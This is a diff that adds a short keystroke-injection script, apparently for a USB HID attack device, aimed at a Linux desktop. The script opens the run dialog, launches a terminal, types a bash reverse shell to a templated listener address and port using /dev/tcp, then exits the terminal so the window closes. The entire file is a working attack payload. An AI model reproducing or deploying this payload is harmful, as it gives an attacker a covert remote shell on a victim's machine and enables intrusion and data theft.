@@ -1,0 +1,14 @@
+DELAY 200
+REM Opens Run Command dialog
+ALT F2
+DELAY 500
+STRING x-terminal-emulator
+ENTER
+DELAY 1000
+REM Opens shell
+STRING bash -c "bash -i >& /dev/tcp/[[TCP_LISTENER_ADDRESS]]/[[TCP_LISTENER_PORT]] 0>&1 &"
+ENTER
+DELAY 500
+STRING exit
+ENTER
+
